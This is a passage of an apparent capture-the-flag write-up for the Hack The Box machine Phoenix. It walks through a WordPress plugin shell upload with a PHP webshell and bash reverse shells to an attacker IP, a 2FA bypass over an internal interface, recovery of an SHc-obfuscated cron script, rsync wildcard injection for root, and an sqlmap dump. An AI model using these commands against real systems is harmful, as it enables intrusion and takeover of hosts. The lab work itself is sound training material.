However, looking at the installed plugins, “Download from files” sounds interesting. Goolging for it returns first the official plugin page, but second a PacketStorm [page on shell upload](https://packetstormsecurity.com/files/164125/WordPress-Download-From-Files-1.48-Shell-Upload.html):

![image-20220216115225263](https://0xdfimages.gitlab.io/img/image-20220216115225263.png)

#### Script Analysis

The script builds a url which for Phoenix will be:

```

https://phoenix.htb/wp-admin/admin-ajax.php?action=download_from_files_617_fileupload

```

It tests if the instance if vulnerable using by looking for the string “Sikeres” in the result. This instance should be vulnerable by that check:

```

oxdf@hacky$ curl -sk https://phoenix.htb/wp-admin/admin-ajax.php?action=download_from_files_617_fileupload | grep Sikeres
{"status":1,"message":"Sikeres a f\u00e1jl(ok) m\u00e1sol\u00e1sa."}

```

The rest is a simple POST request with the file.

#### Run Script

The help menu gives the arguments to pass:

```

oxdf@hacky$ python download_upload.py 
Download From Files <= 1.48 - Arbitrary File Upload
Author -> spacehen (www.github.com/spacehen)
Usage: python3 exploit.py [target url] [php file]
Ex: python3 exploit.py https://example.com ./shell.(php4/phtml)

```

It also says to use a shell ending in `.php4` or `.phtml`. I’ll grab a simple webshell and save it as `cmd.php4`:

```

<?php system($_REQUEST['cmd']); ?>

```

When I run `python download_upload.py https://phoenix.htb cmd.php4`, it crashes out with all kinds of SSL/TLS errors. I’ll add `verify=False` to each of the `requests` calls to ignore the self-signed certificate. I’ll also add the following at the top just under the imports:

```

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

```

This disable warnings line isn’t necessary, but hides some annoying errors.

When I run it, it works:

```

oxdf@hacky$ python download_upload.py https://phoenix.htb cmd.php4 
Download From Files <= 1.48 - Arbitrary File Upload
Author -> spacehen (www.github.com/spacehen)
Uploading Shell...
Shell Uploaded!
https://phoenix.htb/wp-admin/cmd.php4

```

The webshell doesn’t execute:

```

oxdf@hacky$ curl -k https://phoenix.htb/wp-admin/cmd.php4?cmd=id
<?php system($_REQUEST['cmd']); ?>

```

The server is not processing `.php4` files as PHP. I’ll rename the shell to `.phtml` and try again:

```

oxdf@hacky$ python download_upload.py https://phoenix.htb cmd.phtml 
Download From Files <= 1.48 - Arbitrary File Upload
Author -> spacehen (www.github.com/spacehen)
Uploading Shell...
Shell Uploaded!
https://phoenix.htb/wp-admin/cmd.phtml
oxdf@hacky$ curl -k https://phoenix.htb/wp-admin/cmd.phtml?cmd=id
uid=1001(wp_user) gid=1001(wp_user) groups=1001(wp_user)

```

It works.

### Shell

To get a shell, I’ll change the data into a POST request and have `curl` url-encode it:

```

oxdf@hacky$ curl -k https://phoenix.htb/wp-admin/cmd.phtml --data-urlencode 'cmd=id'
uid=1001(wp_user) gid=1001(wp_user) groups=1001(wp_user)

```

Now I’ll replace `id` with a reverse shell. On running, it hangs:

```

oxdf@hacky$ curl -k https://phoenix.htb/wp-admin/cmd.phtml --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'

```

But there’s a shell at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.149 51944
bash: cannot set terminal process group (818): Inappropriate ioctl for device
bash: no job control in this shell
wp_user@phoenix:~/wordpress/wp-admin$ 

```

I’ll upgrade my shell using `script`:

```

wp_user@phoenix:~/wordpress/wp-admin$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
wp_user@phoenix:~/wordpress/wp-admin$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
wp_user@phoenix:~/wordpress/wp-admin$

```

## Shell as editor

### Enumeration

#### Network

Interesting, this host has a second NIC:

```

wp_user@phoenix:/etc/security$ ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.149  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 dead:beef::250:56ff:feb9:396e  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:396e  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:39:6e  txqueuelen 1000  (Ethernet)
        RX packets 22883  bytes 2985758 (2.9 MB)
        RX errors 0  dropped 17  overruns 0  frame 0
        TX packets 14875  bytes 11304672 (11.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=195<UP,BROADCAST,RUNNING,NOARP>  mtu 1500
        inet 10.11.12.13  netmask 255.255.255.0  broadcast 0.0.0.0
        inet6 fe80::4ae:36ff:fe5c:73f9  prefixlen 64  scopeid 0x20<link>
        ether 06:ae:36:5c:73:f9  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1270  bytes 93932 (93.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 120  bytes 26822 (26.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 120  bytes 26822 (26.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

It’s not immediately clear what this is used for, but I’ll keep the IP 10.11.12.13 in mind.

#### Home Directories

There are two users on the box with home directories:

```

wp_user@phoenix:/home$ ls
editor  phoenix

```

wp\_user can’t access either.

Looking for users with shells defined in `/etc/password` returns the same two plus root:

```

wp_user@phoenix:/home$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
phoenix:x:1000:1000:Phoenix:/home/phoenix:/bin/bash
editor:x:1002:1002:John Smith,1,1,1,1:/home/editor:/bin/bash

```

I’ll note that John Smith’s name on the system is editor.

#### Local TOTP

Given that I have John Smith’s WordPress password, I’ll see if it works for the editor account.

Interestingly, if I try to `su`, the behavior isn’t typical. On my local VM, it prompts for a password:

```

oxdf@hacky$ su
Password:

```

But on Phoenix, it prompts for a verification code:

```

wp_user@phoenix:/home$ su - editor
Verification code: 

```

There is likely some kind of TOTP in place on Phoenix as well. With a new username, I’ll try SSH, and it asks for the password the same as it did [above](#ssh---fail), but when I give it, this time it asks for a code:

```

oxdf@hacky$ ssh editor@phoenix.htb
Warning: Permanently added 'phoenix.htb' (ECDSA) to the list of known hosts.
$$$$$$$\  $$\                                     $$\           
$$  __$$\ $$ |                                    \__|          
$$ |  $$ |$$$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\  $$\ $$\   $$\ 
$$$$$$$  |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |\$$\ $$  |
$$  ____/ $$ |  $$ |$$ /  $$ |$$$$$$$$ |$$ |  $$ |$$ | \$$$$  / 
$$ |      $$ |  $$ |$$ |  $$ |$$   ____|$$ |  $$ |$$ | $$  $$<  
$$ |      $$ |  $$ |\$$$$$$  |\$$$$$$$\ $$ |  $$ |$$ |$$  /\$$\ 
\__|      \__|  \__| \______/  \_______|\__|  \__|\__|\__/  \__|
Password: 
Verification code:

```

This result indicates the password is likely correct, but I don’t have the second factor.

#### PAM

Authentication for various access mechanisms on most Linux systems is handled by [Pluggable Authentication Module](https://en.wikipedia.org/wiki/Pluggable_authentication_module), or PAM. The various configs are in `/etc/pam.d`:

```

wp_user@phoenix:/etc/pam.d$ ls
atd             common-password                other      su
chfn            common-session                 passwd     su-l
chpasswd        common-session-noninteractive  polkit-1   sudo
chsh            cron                           runuser    systemd-user
common-account  login                          runuser-l  vmtoolsd
common-auth     newusers                       sshd

```

I’ll pull the `sshd` file back to my VM, and diff it against my local unmodified version:

```

oxdf@hacky$ diff pam-ssh /etc/pam.d/sshd 
5,6c5
< auth [success=1 default=ignore] pam_access.so accessfile=/etc/security/access-local.conf
< auth required pam_google_authenticator.so nullok user=root secret=/var/lib/twofactor/${USER}
---
> 

```

As these two lines are non-standard, I’ll focus there.

The second line says to use `pam_google_authenticator.so`, running as root, with the secrets in `/var/lib/twofactor`. I’ll look at that directory, and there are secrets, but only root can read them:

```

wp_user@phoenix:/var/lib/twofactor$ ls -l
total 12
-r-------- 1 root root 148 Feb 16 18:56 editor
-r-------- 1 root root 159 Jan 19 12:30 phoenix
-r-------- 1 root root 139 Jan 26 05:25 root

```

The other bit references an `accessfile`. From the [pam man page](https://linux.die.net/man/8/pam_access):

> **accessfile=***/path/to/access.conf*
>
> Indicate an alternative access.conf style configuration file to override the default. This can be useful when different services need different access lists.

This file has two lines:

```

wp_user@phoenix:/etc/security$ cat access-local.conf 
+ : ALL : 10.11.12.13/24
- : ALL : ALL

```

This means that the configuration applies on access from 10.11.12.13/24, but not from anything else.

Putting that all together, it says that the standard `pam_access.so` will be enough (so just password) when SSHing to 10.11.12.13, but otherwise it will not, and then it falls backt o `pam_google_authenticator.so`.

### SSH

All of this enumeration put together implies that I can SSH to 10.11.12.13 as editor without the 2FA. I can’t connect to 10.11.12.13 from my host (no route), but I can from the local shell:

```

wp_user@phoenix:/$ ssh editor@10.11.12.13
$$$$$$$\  $$\                                     $$\           
$$  __$$\ $$ |                                    \__|          
$$ |  $$ |$$$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\  $$\ $$\   $$\ 
$$$$$$$  |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |\$$\ $$  |
$$  ____/ $$ |  $$ |$$ /  $$ |$$$$$$$$ |$$ |  $$ |$$ | \$$$$  / 
$$ |      $$ |  $$ |$$ |  $$ |$$   ____|$$ |  $$ |$$ | $$  $$<  
$$ |      $$ |  $$ |\$$$$$$  |\$$$$$$$\ $$ |  $$ |$$ |$$  /\$$\ 
\__|      \__|  \__| \______/  \_______|\__|  \__|\__|\__/  \__|
Password: 
...[snip]...
editor@phoenix:~$

```

On giving the password (“superphoenix”), it returns a prompt for editor.

At this point I can grab `user.txt`:

```

editor@phoenix:~$ cat user.txt
179c07f9************************

```

## Shell as root

### Enumeration

There’s an interesting directory in the filesystem root, `/backups`:

```

editor@phoenix:/$ ls -ld backups/
drwxr-x--- 2 editor editor 4096 Feb 16 19:33 backups/

```

It’s owned by editor, so I couldn’t have gotten into it as wp\_user.

In the directory is a series of `.tar.gz` archives which look like backups, dated every three minutes going back 30 minutes:

```

editor@phoenix:/backups$ ls
phoenix.htb.2022-06-14-22-51.tar.gz  phoenix.htb.2022-06-14-23-06.tar.gz
phoenix.htb.2022-06-14-22-54.tar.gz  phoenix.htb.2022-06-14-23-09.tar.gz
phoenix.htb.2022-06-14-22-57.tar.gz  phoenix.htb.2022-06-14-23-12.tar.gz
phoenix.htb.2022-06-14-23-00.tar.gz  phoenix.htb.2022-06-14-23-15.tar.gz
phoenix.htb.2022-06-14-23-03.tar.gz  phoenix.htb.2022-06-14-23-18.tar.gz

```

Continuing around the filesystem, eventually I’ll find a single file in `/usr/local/bin/`:

```

editor@phoenix:/backups$ cd /usr/local/bin/
editor@phoenix:/usr/local/bin$ ls -la
total 24
drwxr-xr-x  2 root root  4096 Feb 13 20:11 .
drwxr-xr-x 10 root root  4096 Jul 31  2020 ..
-rwxr-xr-x  1 root root 15392 Feb 16 14:19 cron.sh.x

```

This is a 64-bit stripped elf binary:

```

editor@phoenix:/usr/local/bin$ file cron.sh.x 
cron.sh.x: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=04aabcf8803c25ea88a7eada74300f34a17a5cf1, for GNU/Linux 3.2.0, stripped

```

### Dumping Cron Script

#### SHell Compiler Background

Some Googling for “.sh.x files” led me to [this GitHub for UnSHc](https://github.com/yanncam/UnSHc), which describes these files:

> SHc (SHell compiler) is a fabulous tool created and maintained by Francisco Javier Rosales Garcia (http://www.datsi.fi.upm.es/~frosal/). This tool protect any shell script with encryption (ARC4).

This is useful to identify this kind of file. This is basically an encrypted shell script protected / obfuscated by [SHc](http://www.datsi.fi.upm.es/~frosal/).

I’ll show a few ways to recover the script, all of which work but one.

#### Recover with UnSHc - Fail

Unfortunately, the readme warns that the script for decrypting doesn’t work anymore:

> **Due to the many problems since shc 4.0.3, there seems to be a need for clarification. In shc 4.0.3 many structural changes have been incorporated, so that shc now makes use of various security mechanisms provided by the linux-kernel itself. Therefore, it is now almost impossible to extract the original shell script at all with current UnSHc version, if the new shc version was used. This requires a more in-depth approach, which means that a modified bash or a modified linux-kernel is needed to bypass the security measures.**

Just to be sure, I’ll pull a copy of the binary back to my VM and run it:

```

oxdf@hacky$ ./unshc.sh cron.sh.x 
 _   _       _____ _   _      
| | | |     /  ___| | | |     
| | | |_ __ \ `--.| |_| | ___ 
| | | | '_ \ `--. \  _  |/ __|
| |_| | | | /\__/ / | | | (__ 
 \___/|_| |_\____/\_| |_/\___|
--- UnSHc - The shc decrypter.
--- Version: 0.8
------------------------------
UnSHc is used to decrypt script encrypted with SHc
Original idea from Luiz Octavio Duarte (LOD)
Updated and modernized by Yann CAM
- SHc   : [http://www.datsi.fi.upm.es/~frosal/]
- UnSHc : [https://www.asafety.fr/unshc-the-shc-decrypter/]
------------------------------

[*] Input file name to decrypt [cron.sh.x]
[-] Unable to define arc4() call address...

```

It does not work.

#### Recover with PSpy

The `/proc` filesystem is mounted with `hidepid=2`, which means that non-root users can only see their own processes:

```

editor@phoenix:~$ mount | grep "^proc"
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime,hidepid=2)

```

I’ll get a second shell as wp\_user and then SSH to become editor. I’ll also upload [pspy](https://github.com/DominicBreuker/pspy), and run it in one terminal.

Once it’s running, I’ll run `cron.sh.x` manually from the other terminal:

```

editor@phoenix:/usr/local/bin$ ./cron.sh.x 
mysqldump: Got error: 1698: Access denied for user 'root'@'localhost' when trying to connect
gzip: phoenix.htb.2022-02-16-20-45.tar.gz already exists; do you wish to overwrite (y or n)?

```

Back at PSpy, there’s a lot of whitespace (I trimmed out a lot here for readability):

```

2022/02/16 22:33:39 CMD: UID=1002 PID=1801   | cron.sh.x -c exec 'cron.sh.x' "$@" cron.sh.x              
2022/02/16 22:33:39 CMD: UID=1002 PID=1802   | date +%Y-%m-%d-%H-%M                                      
2022/02/16 22:33:39 CMD: UID=1002 PID=1803   | mysqldump -u root wordpress 
2022/02/16 22:33:39 CMD: UID=1002 PID=1804   | cron.sh.x -c                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 #!/bin/sh                                                       
                                                    
NOW=$(date +"%Y-%m-%d-%H-%M")          
FILE="phoenix.htb.$NOW.tar"            
                                                    
cd /backups                            
mysqldump -u root wordpress > dbbackup.sql
tar -cf $FILE dbbackup.sql && rm dbbackup.sql
gzip -9 $FILE                          
find . -type f -mmin +30 -delete                    
rsync --ignore-existing -t *.* jit@10.11.12.14:/backups/                                                                                                                                                           
 cron.sh.x              
2022/02/16 22:33:39 CMD: UID=1002 PID=1805   | rm dbbackup.sql                                           
2022/02/16 22:33:39 CMD: UID=1002 PID=1808   | gzip -9 phoenix.htb.2022-02-16-22-33.tar

```

#### Recover with ps

Because the script hangs when you run it, I’ll just check out the process list. In a clean terminal, there’s only one I’ll start the script running, and when it hangs, Ctrl-z:

```

editor@phoenix:~$ cron.sh.x 
mysqldump: Got error: 1698: Access denied for user 'root'@'localhost' when trying to connect
^Z
[1]+  Stopped                 cron.sh.x
editor@phoenix:~$

```

At the prompt, `ps auxww` will show all processes associated with editor with full command lines:

```

editor@phoenix:~$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
editor      1465  0.0  0.4  18424  9580 ?        Ss   22:31   0:00 /lib/systemd/systemd --user
editor      2194  0.1  0.2   8300  5220 pts/1    Ss   22:35   0:00 -bash
editor      2203  0.0  0.0   2612  1656 pts/1    T    22:35   0:00 cron.sh.x -c                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 #!/bin/sh  NOW=$(date +"%Y-%m-%d-%H-%M") FILE="phoenix.htb.$NOW.tar"  cd /backups mysqldump -u root wordpress > dbbackup.sql tar -cf $FILE dbbackup.sql && rm dbbackup.sql gzip -9 $FILE find . -type f -mmin +30 -delete rsync --ignore-existing -t *.* jit@10.11.12.14:/backups/  cron.sh.x
editor      2212  0.0  0.0   6144   864 pts/1    T    22:35   0:00 rsync --ignore-existing -t phoenix.htb.2022-02-16-22-19.tar.gz phoenix.htb.2022-02-16-22-27.tar.gz phoenix.htb.2022-02-16-22-28.tar.gz phoenix.htb.2022-02-16-22-30.tar.gz phoenix.htb.2022-02-16-22-33.tar phoenix.htb.2022-02-16-22-33.tar.gz phoenix.htb.2022-02-16-22-34.tar.gz phoenix.htb.2022-02-16-22-35.tar.gz jit@10.11.12.14:/backups/
editor      2213  0.0  0.3  12008  6240 pts/1    T    22:35   0:00 ssh -l jit 10.11.12.14 rsync --server -te.LsfxC --ignore-existing . /backups/
editor      2234  0.0  0.1   8892  3280 pts/1    R+   22:35   0:00 ps auxww

```

There’s a ton of whitespace after the `/cron.sh.x`, but then comes the full script!

#### Recover from /proc

Another way to get the script is from `/proc`. I’ll start it, and then background it with Ctrl-z:

```

editor@phoenix:~$ cron.sh.x          
mysqldump: Got error: 1698: Access denied for user 'root'@'localhost' when trying to connect
^Z                                                          
[1]+  Stopped                 cron.sh.x      
editor@phoenix:~$

```

`jobs -p` will give the process ids of any jobs (the backgrounded process):

```

editor@phoenix:~$ jobs -p  
76149  

```

I’ll get the command line from `/proc`:

![image-20220624171620437](https://0xdfimages.gitlab.io/img/image-20220624171620437.png)

That’s a nice clean look at the script.

### Script Analysis

The script being run cleans up with some added whitespace to:

```

#!/bin/sh

NOW=$(date +"%Y-%m-%d-%H-%M")
FILE="phoenix.htb.$NOW.tar"

cd /backups mysqldump -u root wordpress > dbbackup.sql
tar -cf $FILE dbbackup.sql && rm dbbackup.sql
gzip -9 $FILE
find . -type f -mmin +30 -delete
rsync --ignore-existing -t *.* jit@10.11.12.14:/backups/

```

It’s going into the `/backups` directory, and creating a dump of the database. Then it’s putting that into a tar archive and then compressing it. It looks for files older than 30 minutes and deletes them. Finally it uses `rsync` to copy them to presumably another server as the jit user.

### Wildcard Injection

#### Background

Wildcard injection is something I’ve seen before on HTB, but not in a while. The issue is that Bash will expand out the wildcard to be a list of files. So when you do something like:

```

oxdf@hacky$ touch test1 test2 test3
oxdf@hacky$ rm *

```

On the second line, bash first expands the `*` to:

```

oxdf@hacky$ rm test1 test2 test3

```

And then runs that command. The trick is to make a file that actually looks like an argument to the command being run.

So for `rsync`, there’s the `-e` flag, [which](https://linux.die.net/man/1/rsync):

> ```

> -e, --rsh=COMMAND           specify the remote shell to use
>
> ```

This is a bit misleading. It actually typically looks like:

```

$ rsync -e sh PATH_TO_SCRIPT SRC DEST

```

So if I can create a file named `-e bash rev.sh`, the wildcard will inject into the command, and my command will run.

#### Reverse Shell

To pull this off, I’ll create two files. The first is a simple reverse shell generated with this `echo` command:

```

echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.6/443 0>&1' > 0xdf.sh

```

The second is an empty file, where the filename is the important part, generated with `touch`:

```

touch -- '-e bash 0xdf.sh'

```

`--` tells the command that anything after is not an argument, so it creates that file name.

Putting that all on one line and running it creates both files:

```

editor@phoenix:/backups$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.6/443 0>&1' > 0xdf.sh; touch -- '-e bash 0xdf.sh'
editor@phoenix:/backups$ ls -la
total 3632
drwxr-x---  2 editor editor   4096 Feb 16 23:02  .
drwxr-xr-x 21 root   root     4096 Jan 26 05:29  ..
-rw-rw-r--  1 editor editor     53 Feb 16 23:02  .0xdf.sh
-rw-rw-r--  1 editor editor      0 Feb 16 23:02 '-e bash .0xdf.sh'
...[snip]...

```

The next time the cron runs (every three minutes), I get a reverse shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.149 35844
bash: cannot set terminal process group (3403): Inappropriate ioctl for device
bash: no job control in this shell
root@phoenix:/backups#

```

And after a quick shell upgrade, I can grab `root.txt`:

```

root@phoenix:~# cat root.txt
5047bc59************************

```

## Beyond Root - Alternative Path

The entire foothold step for this box relies on getting into WordPress so that I can see the vulnerable plugin and use it to get RCE. And while the intended path is to use the SQL injection to get the credentials and secrets necessary to log in, it’s also possible to just read the plugins list from the database:

```

oxdf@hacky$ sqlmap --url "https://phoenix.htb/forum/?subscribe_topic=*" --dbms=mysql --technique=T --level 5 -D wordpress -T wp_options -C option_value --where "option_name = '
active_plugins'" --dump --batch
...[snip]...
Database: wordpress
Table: wp_options
[1 entry]
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| option_value|
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| a:9:{i:0;s:45:"accordion-slider-gallery/accordion-slider.php";i:1;s:25:"adminimize/adminimize.php";i:2;s:31:"asgaros-forum/asgaros-forum.php";i:3;s:43:"download-from-files/download-from-files.php";i:4;s:67:"miniorange-2-factor-authentication/miniorange_2_factor_settings.php";i:5;s:47:"photo-gallery-builder/photo-gallery-builder.php";i:6;s:29:"pie-register/pie-register.php";i:7;s:45:"simple-local-avatars/simple-local-avatars.php";i:8;s:38:"timeline-event-history/timeline-wp.php";} |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

```

With this list, it’s possible see the `download-from-files` is installed, and find the public exploit, skipping the hash crack and the 2FA computation.